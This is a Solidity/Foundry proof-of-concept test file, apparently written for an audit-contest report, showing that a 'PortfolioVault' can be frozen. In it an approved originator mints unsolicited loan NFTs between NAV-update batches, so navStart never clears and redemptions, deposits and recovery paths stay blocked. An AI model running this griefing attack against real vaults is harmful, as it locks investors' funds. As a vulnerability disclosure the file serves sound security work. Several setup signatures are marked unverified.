// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.33;

// =============================================================================
//  Tare — PortfolioVault: navStart is one-way, and a third party can hold it open.
// =============================================================================
//
//  Verified signatures (read from the contest source):
//    PortfolioVault(ILoans, ILoansNFT, ILoansExchange, IERC20, IVaultShareToken,
//                   INavCalculator, address guardian, address recovery,
//                   uint256 maxNavAge, uint256 maxNavComputationTime)
//    NavCalculator(address initialGuardian, uint256[8] initialFactors)
//    PortfolioVault.updateNav(uint256 batchSize)
//    PortfolioVault.navStart() / navCursor() / lastNav() / lastNavUpdate()
//
//  Unverified, marked `// SIG?`: the Loans / LoansNFT / LoansExchange /
//  VaultShareToken constructors and the Loans origination helpers. Those files
//  were not available for this write-up. Fix the `// SIG?` lines against the
//  contest commit before running.
//
//  The assertions that carry the finding read only PortfolioVault public state,
//  so they survive signature drift in the setup.
//
//  Run:  forge test --match-contract NavStartPermanentFreeze -vvv
// =============================================================================

import {Test} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";

import {PortfolioVault} from "contracts/PortfolioVault.sol";
import {NavCalculator} from "contracts/NavCalculator.sol";
import {Loans} from "contracts/Loans.sol";
import {LoansNFT} from "contracts/LoansNFT.sol";
import {LoansExchange} from "contracts/LoansExchange.sol";
import {VaultShareToken} from "contracts/VaultShareToken.sol";
import {ILoans, Roles} from "contracts/interfaces/ILoans.sol";
import {ILoansNFT} from "contracts/interfaces/ILoansNFT.sol";
import {ILoansExchange} from "contracts/interfaces/ILoansExchange.sol";
import {INavCalculator} from "contracts/interfaces/INavCalculator.sol";
import {IVaultShareToken} from "contracts/interfaces/IVaultShareToken.sol";

contract MockUSDC is ERC20 {
  constructor() ERC20("Mock USDC", "USDC") {}

  function mint(address to, uint256 amount) external {
    _mint(to, amount);
  }
}

contract NavStartPermanentFreeze is Test {
  MockUSDC internal usdc;
  Loans internal loans;
  LoansNFT internal loansNFT;
  LoansExchange internal exchange;
  VaultShareToken internal shareToken;
  NavCalculator internal calculator;
  PortfolioVault internal vault;

  address internal guardian = makeAddr("guardian");
  address internal recovery = makeAddr("recovery");
  address internal manager = makeAddr("manager"); // PORTFOLIO_MANAGER + INVESTOR_MANAGER
  address internal servicer = makeAddr("servicer");
  address internal borrower = makeAddr("borrower");

  // The attacker. In this test an approved originator (Route B of the report):
  // free, unlimited NFT minting straight into the vault, no funds moved.
  address internal attackerOriginator = makeAddr("attackerOriginator");

  address internal alice = makeAddr("alice"); // shareholder who wants out

  uint256 internal constant MAX_NAV_AGE = 4 hours;
  uint256 internal constant MAX_NAV_COMPUTATION_TIME = 1 hours;

  // Portfolio large enough that the manager sweeps it in several batches.
  uint256 internal constant PORTFOLIO_SIZE = 40;
  uint256 internal constant BATCH_SIZE = 10;

  function setUp() public {
    usdc = new MockUSDC();

    loans = new Loans(IERC20(address(usdc)), guardian, recovery); // SIG?
    loansNFT = new LoansNFT(address(loans), "Tare Loans", "https://tare.example/loans/"); // SIG?
    vm.prank(guardian);
    loans.setLoansNFT(address(loansNFT)); // SIG?

    exchange = new LoansExchange(ILoans(address(loans)), ILoansNFT(address(loansNFT)), IERC20(address(usdc)), guardian, recovery); // SIG?
    shareToken = new VaultShareToken("Tare Vault Share", "tVS", guardian); // SIG?

    uint256[8] memory factors = [
      uint256(1e18), // Current
      0.9e18, // DQ30
      0.75e18, // DQ60
      0.5e18, // DQ90
      0.25e18, // DQ120
      0.05e18, // ChargedOff
      1e18, // Closed
      0 // Cancelled
    ];
    calculator = new NavCalculator(guardian, factors);

    // Dead-share mint in the constructor needs DEAD_ADDRESS to hold SHAREHOLDER_ROLE.
    vm.startPrank(guardian);
    shareToken.grantRole(shareToken.SHAREHOLDER_ROLE(), address(0xdead)); // SIG?
    vm.stopPrank();

    vault = new PortfolioVault(
      ILoans(address(loans)),
      ILoansNFT(address(loansNFT)),
      ILoansExchange(address(exchange)),
      IERC20(address(usdc)),
      IVaultShareToken(address(shareToken)),
      INavCalculator(address(calculator)),
      guardian,
      recovery,
      MAX_NAV_AGE,
      MAX_NAV_COMPUTATION_TIME
    );

    vm.startPrank(guardian);
    shareToken.grantRole(shareToken.SHAREHOLDER_ROLE(), address(vault)); // SIG?
    shareToken.grantRole(shareToken.SHAREHOLDER_ROLE(), alice); // SIG?
    shareToken.setVault(address(vault)); // SIG?
    vault.grantRole(vault.PORTFOLIO_MANAGER(), manager);
    vault.grantRole(vault.INVESTOR_MANAGER(), manager);
    loans.approveOriginator(attackerOriginator);
    vm.stopPrank();

    // The attacker curates its own address book (permissionless, known issue #14)
    // and names the VAULT as an investor. The vault never consents to this.
    vm.startPrank(attackerOriginator);
    loans.registerAddress(Roles.Borrower, borrower);
    loans.registerAddress(Roles.Investor, address(vault));
    loans.registerAddress(Roles.Servicer, servicer);
    vm.stopPrank();

    // Build a portfolio the vault legitimately holds and values.
    uint64[] memory ids = new uint64[](PORTFOLIO_SIZE);
    for (uint256 i; i < PORTFOLIO_SIZE; ++i) {
      vm.prank(attackerOriginator);
      ids[i] = loans.create(borrower, address(vault), servicer, attackerOriginator, int128(1000e6), uint48(block.timestamp)); // SIG?
    }
    vm.prank(manager);
    vault.addLoansToNav(ids);

    // Seed liquidity so NAV is non-zero (known issue #7 bootstrap workaround).
    usdc.mint(address(vault), 1_000_000e6);

    // One clean, uninterrupted NAV cycle so the vault starts in a healthy state.
    _sweepToCompletion();
    assertEq(vault.navStart(), 0, "setup: vault should start idle");
    assertGt(vault.lastNav(), 0, "setup: NAV should be established");
  }

  // ---------------------------------------------------------------------------
  //  The finding.
  // ---------------------------------------------------------------------------

  /// @notice One unsolicited NFT per updateNav transaction resets the cursor to
  ///         zero forever. navStart never returns to 0, so the vault never unfreezes.
  function test_attackerHoldsNavStartOpenIndefinitely() public {
    uint256 batchesNeeded = PORTFOLIO_SIZE / BATCH_SIZE; // 4 clean batches would finish it

    // Run for far longer than an honest sweep would need.
    for (uint256 round; round < batchesNeeded * 5; ++round) {
      vm.prank(manager);
      vault.updateNav(BATCH_SIZE);

      // Manager made progress but never reached the end.
      assertGt(vault.navStart(), 0, "cycle should still be open");
      assertLe(vault.navCursor(), BATCH_SIZE, "cursor never gets past one batch");

      // Attacker mints one loan NFT straight into the vault. Free: no funds move
      // at create time (known issue #20). This bumps ownershipNonce(vault).
      vm.prank(attackerOriginator);
      loans.create(borrower, address(vault), servicer, attackerOriginator, int128(1e6), uint48(block.timestamp)); // SIG?

      vm.roll(block.number + 1);
      vm.warp(block.timestamp + 12);
    }

    // After 20 batches of work on a 4-batch portfolio, the vault is still stuck.
    assertGt(vault.navStart(), 0, "navStart is never cleared: the vault is frozen");
    emit log_named_uint("rounds of manager work burned", batchesNeeded * 5);
    emit log_named_uint("navCursor after all of it     ", vault.navCursor());
  }

  /// @notice What being frozen actually costs: every entry point is gated behind
  ///         the same flag, including both evacuation paths.
  function test_everyPrivilegedPathIsGatedBehindTheStuckFlag() public {
    // Open a cycle and hold it open once.
    vm.prank(manager);
    vault.updateNav(BATCH_SIZE);
    vm.prank(attackerOriginator);
    loans.create(borrower, address(vault), servicer, attackerOriginator, int128(1e6), uint48(block.timestamp)); // SIG?
    vm.prank(manager);
    vault.updateNav(BATCH_SIZE);
    assertGt(vault.navStart(), 0);

    uint64[] memory one = new uint64[](1);
    one[0] = 1;

    // Investors cannot exit.
    vm.prank(manager);
    vm.expectRevert(PortfolioVault.NavComputationInProgress.selector);
    vault.approveRedemption(alice, 1);

    // Investors cannot enter.
    vm.prank(manager);
    vm.expectRevert(PortfolioVault.NavComputationInProgress.selector);
    vault.approveDeposit(alice, 1);

    // Cashflows cannot be collected.
    vm.prank(manager);
    vm.expectRevert(PortfolioVault.NavComputationInProgress.selector);
    vault.collectCashflows(one, "collect");

    // The portfolio cannot be evacuated.
    vm.prank(manager);
    vm.expectRevert(PortfolioVault.NavComputationInProgress.selector);
    vault.transferLoans(one, recovery);

    // The documented migration path (known issue #30) is unreachable.
    vm.prank(guardian);
    vm.expectRevert(PortfolioVault.NavComputationInProgress.selector);
    vault.setLoans(address(loans), address(loansNFT));
  }

  /// @notice The two configuration levers admin/guardian actually have do not
  ///         clear navStart. Neither does pausing and unpausing.
  function test_noAdminLeverClearsNavStart() public {
    vm.prank(manager);
    vault.updateNav(BATCH_SIZE);
    assertGt(vault.navStart(), 0);

    // setMaxNavComputationTime is deliberately NOT idle-gated, so it is callable --
    // and it is useless, because the nonce mismatch is a separate disjunct.
    vm.prank(guardian);
    vault.setMaxNavComputationTime(365 days);
    assertGt(vault.navStart(), 0, "raising the computation window does not clear the flag");

    vm.prank(guardian);
    vault.setMaxNavAge(365 days);
    assertGt(vault.navStart(), 0, "raising the NAV age does not clear the flag");

    vm.startPrank(guardian);
    vault.pause(); // SIG?
    vault.unpause(); // SIG?
    vm.stopPrank();
    assertGt(vault.navStart(), 0, "pause/unpause does not clear the flag");
  }

  /// @notice Control: with no attacker, the same portfolio sweeps to completion
  ///         and the vault returns to idle. Proves the freeze is caused by the
  ///         interleaved nonce bump, not by the portfolio size alone.
  function test_control_sweepCompletesWithoutInterference() public {
    vm.prank(manager);
    vault.updateNav(BATCH_SIZE);
    assertGt(vault.navStart(), 0, "cycle opens");

    _sweepToCompletion();
    assertEq(vault.navStart(), 0, "without interference the cycle finalises");
    assertEq(vault.lastNavUpdate(), block.timestamp, "and NAV is fresh again");
  }

  // ---------------------------------------------------------------------------

  function _sweepToCompletion() internal {
    for (uint256 i; i < 50; ++i) {
      vm.prank(manager);
      vault.updateNav(BATCH_SIZE);
      if (vault.navStart() == 0) return;
    }
    revert("sweep did not finalise within 50 batches");
  }
}
